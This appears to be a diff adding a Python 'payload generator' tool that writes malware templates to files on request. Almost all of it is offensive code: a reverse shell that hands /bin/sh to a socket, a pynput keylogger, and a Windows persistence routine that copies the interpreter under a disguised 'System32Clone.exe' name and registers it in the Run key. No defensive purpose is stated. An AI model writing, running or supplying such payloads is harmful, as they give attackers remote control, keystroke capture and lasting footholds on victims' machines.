@@ -1,0 +1,50 @@
+import os
+from datetime import datetime
+
+payloads = {
+    "reverse_shell": """
+import socket,subprocess,os
+s=socket.socket()
+s.connect(("127.0.0.1",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])
+""",
+
+    "keylogger": """
+import pynput.keyboard
+def log_keystrokes():
+    with pynput.keyboard.Listener(on_press=lambda k: print(f"Key: {k}")) as listener:
+        listener.join()
+log_keystrokes()
+""",
+
+    "persistence": """
+import os
+import shutil
+import sys
+def simulate_persistence():
+    location = os.getenv("APPDATA") + "\\System32Clone.exe"
+    if not os.path.exists(location):
+        shutil.copyfile(sys.executable, location)
+        os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysClone /t REG_SZ /d "{location}"')
+simulate_persistence()
+"""
+}
+
+def generate_payload(name):
+    if name not in payloads:
+        print("[!] Payload not found.")
+        return
+    now = datetime.now().strftime("%Y%m%d_%H%M%S")
+    filename = f"payloads/{name}_{now}.py"
+    with open(filename, "w") as f:
+        f.write(payloads[name])
+    print(f"[+] Generated payload: {filename}")
+
+if __name__ == "__main__":
+    print("NeuroStrike Payload Generator")
+    print("Available payloads: ", list(payloads.keys()))
+    choice = input("Choose payload to generate: ")
+    generate_payload(choice)
